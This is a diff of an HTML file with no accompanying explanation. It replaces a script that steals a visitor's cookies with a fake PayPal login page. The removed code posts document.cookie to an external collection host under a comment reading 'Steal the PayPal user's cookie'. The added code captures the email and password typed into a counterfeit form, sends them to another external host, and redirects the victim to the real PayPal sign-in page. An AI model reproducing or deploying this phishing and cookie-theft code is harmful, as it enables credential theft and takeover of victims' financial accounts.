@@ -2,21 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Cookie Viewer</title>
-    <script>
-        // Steal the PayPal user's cookie
-        const cookie = document.cookie;
-        const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://p9zddzjwb2zi82hprcvsxfk9y04tsi.oastify.com', true);
-        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        xhr.send(`cookie=${cookie}`);
-
-// Optional: Redirect the user back to PayPal to maintain a seamless experience
-        window.location.href = 'https://www.paypal.com';
-    </script>
+    <title>Login - PayPal</title>
+    <style>
+        /* Add PayPal styles here */
+    </style>
 </head>
 <body>
-    <h1>Cookie Viewer Page</h1>
-    <!-- Optional: Add more content to your page -->
+    <h1>Login to PayPal</h1>
+    <form id="loginForm">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Log In</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://cvblh7c1g7bdnvixd0avjssvgmmca1.oastify.com', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send(`email=${email}&password=${password}`);
+
+            // Optionally, redirect the user back to the actual PayPal login page
+            window.location.href = 'https://www.paypal.com/signin';
+        };
+    </script>
 </body>
 </html>
